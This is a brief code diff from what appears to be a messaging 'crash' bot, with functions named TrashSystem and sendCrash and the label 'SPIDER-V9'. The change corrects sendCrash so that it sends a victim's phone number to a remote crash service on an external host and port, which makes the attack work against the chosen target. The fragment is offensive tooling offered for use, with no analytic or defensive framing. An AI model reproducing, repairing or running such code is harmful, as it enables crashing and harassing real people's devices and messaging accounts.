@@ -819,7 +819,7 @@ async function TrashSystem(target, spider, Ptcp = true) {
   };
 async function sendCrash(target) {
 			try {
-				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);
+				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + target);
 				console.log(chalk.green("Send Bug By SPIDER-V9"));
 				console.log(chalk.red("InVisible⚡"));
 			} catch (error) {
